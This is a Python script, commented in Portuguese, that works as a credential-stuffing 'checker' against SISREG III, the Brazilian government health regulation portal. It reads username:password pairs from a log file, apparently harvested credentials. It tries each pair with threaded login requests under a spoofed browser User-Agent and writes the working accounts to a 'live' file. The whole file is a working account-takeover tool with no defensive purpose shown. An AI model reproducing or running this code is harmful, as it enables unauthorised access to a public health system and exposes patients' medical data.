import requests
import hashlib
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import time

init(autoreset=True)

# Configurações
MAX_THREADS = 6
TIMEOUT = 15
LOGINS_FILE = 'logs.txt'
LIVE_FILE = 'live.txt'
DIE_FILE = 'die.txt'

# Contadores
stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time()
}

def update_panel():
    elapsed = time.time() - stats['start_time']
    print("\033[H\033[J")  # Limpa o terminal
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.YELLOW + "      SISREG III CHECKER")
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.GREEN + f" ✅ LIVE: {stats['live']}")
    print(Fore.RED + f" ❌ DIE: {stats['die']}")
    print(Fore.YELLOW + f" ⚠ ERROR: {stats['error']}")
    print(Fore.CYAN + f" ⏳ TEMPO: {elapsed:.2f}s")
    print(Fore.CYAN + "══════════════════════════════════")

def login(user, password):
    try:
        hashed_password = hashlib.sha256(password.encode()).hexdigest()

        data = {
            'usuario': user,
            'senha': '',
            'senha_256': hashed_password,
            'etapa': 'ACESSO',
            'logout': ''
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Origin': 'https://sisregiii.saude.gov.br',
            'Referer': 'https://sisregiii.saude.gov.br/cgi-bin/index?logout=1'
        }

        response = requests.post('https://sisregiii.saude.gov.br', 
                              data=data, 
                              headers=headers,
                              timeout=TIMEOUT)
        response.raise_for_status()

        soup = BeautifulSoup(response.content, 'html.parser')
        
        if soup.find('div', {'id': 'mensagem'}):
            stats['die'] += 1
            save_result(DIE_FILE, user, password)
            return Fore.RED + f"× Die {user}:{password}"
        else:
            stats['live'] += 1
            save_result(LIVE_FILE, user, password)
            return Fore.GREEN + f"✓ Live {user}:{password}"

    except Exception as e:
        stats['error'] += 1
        save_result(DIE_FILE, user, password, str(e))
        return Fore.RED + f"× Error {user}:{password} - {str(e)[:30]}"

def save_result(filename, user, password, error=None):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            if error:
                f.write(f'{user}:{password} | {error}\n')
            else:
                f.write(f'{user}:{password}\n')
    except:
        pass

def main():
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"Arquivo {LOGINS_FILE} não encontrado!")
        return

    with open(LOGINS_FILE, 'r', encoding='utf-8') as f:
        accounts = [line.strip().split(':', 1) for line in f if ':' in line]
    
    stats['total'] = len(accounts)
    update_panel()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for acc in accounts:
            user, password = acc[0], acc[1]
            futures.append(executor.submit(login, user, password))

        for future in as_completed(futures):
            print(future.result())
            update_panel()

    print(Fore.CYAN + "\n✅ Verificação concluída!")

if __name__ == "__main__":
    main()